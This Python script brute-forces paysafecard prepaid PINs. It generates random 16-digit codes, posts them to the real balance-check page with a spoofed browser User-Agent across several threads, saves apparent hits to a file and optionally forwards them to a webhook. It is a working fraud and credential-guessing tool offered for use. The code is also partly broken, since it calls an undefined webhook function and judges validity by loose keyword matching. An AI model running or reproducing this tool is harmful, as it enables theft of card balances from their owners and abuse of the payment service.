import requests
from bs4 import BeautifulSoup
import random
import string
from colorama import init, Fore, Style
import os
import threading
import queue
import time
from datetime import datetime

init()

BANNER = """
                   ############                   
               ####################               
             ########################             
           ############################           
          #########            #########          
         ########                ########         
         ######                    ######         
         ######                    ######         
        ######                      ######        
        ######                      ######        
        ##   ########################   ##        
         ################################         
        ##################################        
        ##################################        
       ####################################       
       ####################################       
       ####################################       
       ####################################       
       ####################################       
       ####################################       
       ####################################       
       ####################################       
       ####################################       
        ##################################        
        ##################################        
         ################################         
           #############################          
"""

# Create a small thread-safe session pool
session_pool = queue.Queue()
for _ in range(4):
    session = requests.Session()
    session_pool.put(session)

# Thread-safe queue for valid codes
valid_codes_queue = queue.Queue()
attempts_counter = 0
lock = threading.Lock()

last_request_time = datetime.now()
rate_limit_delay = 1.0  # Seconds between requests


def get_session():
    session = session_pool.get()
    session_pool.put(session)
    return session


def check_psc_code(code):
    """Check code validity using session from pool"""
    global last_request_time, attempts_counter
    max_retries = 3
    retry_count = 0

    while retry_count < max_retries:
        try:
            # Increment attempts counter
            with lock:
                attempts_counter += 1

            # Rate limiting
            time_since_last = datetime.now() - last_request_time
            if time_since_last.total_seconds() < rate_limit_delay:
                time.sleep(rate_limit_delay - time_since_last.total_seconds())
            last_request_time = datetime.now()

            session = get_session()

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
            }

            response = session.post(
                "https://www.paysafecard.com/en/check-balance/",
                headers=headers,
                data={"pin": code, "submit": "Check balance"},
                timeout=10,
            )

            response_text = response.text.lower()

            # Check for error messages
            error_messages = ["is invalid", "invalid pin", "incorrect code", "error"]
            if any(error in response_text for error in error_messages):
                return False

            # Check for success indicators
            success_indicators = ["balance", "valid", "success"]
            if any(indicator in response_text for indicator in success_indicators):
                return True

            return False

        except Exception as e:
            retry_count += 1
            time.sleep(1)
            continue

    return False


def generate_and_check():
    """Worker function for threads"""
    while True:
        code = "0" + "".join(random.choices(string.digits, k=15))

        if check_psc_code(code):
            valid_codes_queue.put(code)
            print(Fore.GREEN + f"[+] VALID: {code}" + Style.RESET_ALL)

            # Save immediately to file
            with lock:
                with open("workingcodes.txt", "a") as f:
                    f.write(f"{code}\n")

            # Send webhook if configured
            if webhook_url:
                send_webhook(webhook_url, code)


def main():
    os.system("cls")
    print(Fore.RED + BANNER + Style.RESET_ALL)

    global webhook_url
    webhook_url = None

    if input(Fore.YELLOW + "[?] Use webhook? (y/n): " + Style.RESET_ALL).lower() == "y":
        webhook_url = input(Fore.YELLOW + "[?] Webhook URL: " + Style.RESET_ALL)

    thread_count = 4
    print(Fore.CYAN + f"[*] Starting {thread_count} threads..." + Style.RESET_ALL)

    threads = []
    for i in range(thread_count):
        thread = threading.Thread(
            target=generate_and_check, name=f"Worker-{i}", daemon=True
        )
        thread.start()
        threads.append(thread)

    # Progress tracking
    try:
        last_count = 0
        while True:
            time.sleep(1)
            with lock:
                current_count = attempts_counter
                rate = current_count - last_count
                last_count = current_count
                print(
                    f"\r[*] Attempts: {current_count} ({rate}/s) | Valid: {valid_codes_queue.qsize()}",
                    end="",
                )

    except KeyboardInterrupt:
        print(
            f"\n{Fore.YELLOW}[*] Found {valid_codes_queue.qsize()} valid codes{Style.RESET_ALL}"
        )


if __name__ == "__main__":
    main()
